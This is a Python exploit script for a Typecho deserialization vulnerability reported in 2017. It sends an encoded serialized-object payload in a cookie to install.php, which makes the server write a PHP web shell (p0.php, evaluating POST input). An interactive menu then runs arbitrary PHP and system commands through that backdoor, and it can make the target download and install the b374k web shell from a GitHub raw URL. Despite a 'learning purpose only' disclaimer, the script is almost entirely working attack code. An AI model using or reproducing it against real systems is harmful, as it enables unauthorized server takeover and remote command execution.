#!/usr/bin/python
# coding:utf-8

# Typecho deserialization vulnerability found on 28 Oct 2017.
# This scripts is for learning purpose ONLY.
# DO NOT use on unauthorized circumstances.
# USE AT YOUR OWN RISK!!!


__credit__ = 'http://www.blogsir.com.cn/safe/454.html'
__author__ = 'Benny <benny@bennythink.com>'

import requests

PAYLOAD = 'YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdwMC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW3AwXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ== '


def exploit(url):
    print 'Your target url is ' + url
    target = url + '/install.php?finish'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
        'Referer': url + '/install.php',
        'cookie': "__typecho_config=" + PAYLOAD
    }
    try:
        html = requests.get(url=target, headers=headers, timeout=3)
        if html.status_code == 404:
            return 'the file install.php is not exists'
        print 'shell:', url + '/p0.php'
        write_log(url + '/p0.php')
    except Exception, e:
        print e
        return False


def verify(url):
    if url.startswith('http://') or url.startswith('https'):
        exploit(url)
    else:
        print 'You parameter must be a valid url, i.e:http://localhost/ty'


def write_log(backdoor):
    with open('backdoor.log', 'w') as f:
        f.write(backdoor)


def read_log():
    with open('backdoor.log', 'r') as f:
        content = f.readlines()
    return content


def run_php():
    add = get_target()
    target_code = {'p0': raw_input('Enter your PHP code:\n>')}
    html = requests.post(add, target_code)

    if html.status_code == 200:
        print html.text
    else:
        print 'Something is wrong..'


def run_commands():
    add = get_target()
    target_code = {'p0': 'system("%s");' % raw_input('Enter your system commands:\n>')}
    html = requests.post(add, target_code)

    if html.status_code == 200:
        print html.text
    else:
        print 'Something is wrong..'


def b374k():
    add = get_target()
    target_code = {
        'p0': "$file = file_get_contents('https://raw.githubusercontent.com/BennyThink/Typecho_deserialization_exploit/master/b374k.php');file_put_contents('b374k.php',$file);"}

    html = requests.post(add, target_code)

    if html.status_code == 200:
        print 'visit %s/b374k.php ' % add[0:-7]
    else:
        print 'Something is wrong..'


def get_target():
    exp_record = read_log()
    index = 1
    for i in exp_record:
        print index, '. ', i,
        index += 1
    target_choice = raw_input('Enter your target number:\n>')
    add = exp_record[int(target_choice) - 1].rstrip()
    return add


if __name__ == '__main__':

    while 1:
        print '1. Exploit'
        print '2. Run any PHP code. post methods.'
        print '3. Run system commands such as ls, pwd'
        print '4. Deploy b374k'
        choice = raw_input('Select your action, q to exit:\n>')

        if choice == '1':
            base_url = raw_input('Input your target, i.e:http://localhost/ty\n>')
            verify(base_url)
        elif choice == '2':
            run_php()
        elif choice == '3':
            run_commands()
        elif choice == '4':
            b374k()
        elif choice == 'q':
            break
        else:
            print 'Wrong choice.'
